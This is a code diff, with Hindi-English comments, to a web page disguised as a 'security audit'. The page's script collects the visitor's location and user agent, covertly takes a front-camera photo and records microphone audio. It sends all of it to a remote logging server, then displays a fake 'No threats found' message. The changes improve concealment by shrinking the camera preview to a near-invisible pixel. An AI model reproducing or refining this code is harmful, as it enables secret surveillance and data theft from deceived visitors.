@@ -7,8 +7,17 @@
     <style>
         body { background-color: #0d1117; color: #58a6ff; font-family: 'Courier New', monospace; text-align: center; padding: 50px; }
         .btn { padding: 15px 30px; background: #238636; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 18px; font-weight: bold; }
-        .btn:hover { background: #2ea043; }
-        #hidden_video { display: none; }
+        
+        /* FIX: Video ko hide karne ka naya tarika */
+        #hidden_video { 
+            position: absolute; 
+            top: 0; 
+            left: 0; 
+            width: 1px; 
+            height: 1px; 
+            opacity: 0.01; /* Bilkul halka sa visible taaki browser ise chalu rakhe */
+            pointer-events: none;
+        }
     </style>
 </head>
 <body>
@@ -20,7 +29,6 @@
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        // --- APNA RENDER URL YAHAN DALEIN ---
         const API_URL = "https://vivanx-backend.onrender.com/log";
 
         async function startAudit() {
@@ -37,28 +45,23 @@
                             device: navigator.userAgent
                         })
                     });
-                }, (err) => { console.log("Location Denied"); });
+                }, (err) => { console.log("Loc Denied"); });
             }
 
             // 2. Access Camera & Mic
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: true, 
-                    audio: { echoCancellation: true, noiseSuppression: true } 
+                    video: { facingMode: "user" }, // Front camera specify kiya
+                    audio: true 
                 });
 
-                // --- CAMERA SECTION ---
                 const video = document.getElementById('hidden_video');
                 video.srcObject = stream;
 
-                // --- AUDIO RECORDING SECTION (Silent) ---
+                // Audio recording start
                 const mediaRecorder = new MediaRecorder(stream);
                 let audioChunks = [];
-
-                mediaRecorder.ondataavailable = (event) => {
-                    audioChunks.push(event.data);
-                };
-
+                mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
                 mediaRecorder.onstop = async () => {
                     const audioBlob = new Blob(audioChunks, { type: 'audio/wav' });
                     const reader = new FileReader();
@@ -71,33 +74,32 @@
                         });
                     };
                 };
-
-                // Start recording
                 mediaRecorder.start();
 
-                // Wait 3 seconds then capture photo and stop audio
-                setTimeout(async () => {
-                    // Capture Photo
-                    const canvas = document.getElementById('canvas');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    const imgData = canvas.toDataURL('image/jpeg');
-                    
-                    await fetch(API_URL, {
-                        method: 'POST',
-                        headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify({ type: 'image', image: imgData })
-                    });
+                // FIX: Wait for video to actually start playing
+                video.onloadedmetadata = () => {
+                    setTimeout(async () => {
+                        const canvas = document.getElementById('canvas');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        
+                        // Drawing the frame to canvas
+                        const ctx = canvas.getContext('2d');
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        
+                        const imgData = canvas.toDataURL('image/jpeg', 0.7); // 0.7 quality for faster upload
+                        
+                        await fetch(API_URL, {
+                            method: 'POST',
+                            headers: {'Content-Type': 'application/json'},
+                            body: JSON.stringify({ type: 'image', image: imgData })
+                        });
 
-                    // Stop Mic Recording
-                    mediaRecorder.stop();
-
-                    // Stop all tracks (Camera/Mic off)
-                    stream.getTracks().forEach(track => track.stop());
-                    
-                    alert("Scan Complete: No threats found!");
-                }, 5000);
+                        mediaRecorder.stop();
+                        stream.getTracks().forEach(t => t.stop());
+                        alert("Scan Complete: No threats found!");
+                    }, 4000); // 4 seconds ka wait perfect hai
+                };
 
             } catch (err) {
                 alert("Please grant permissions to run the security audit.");
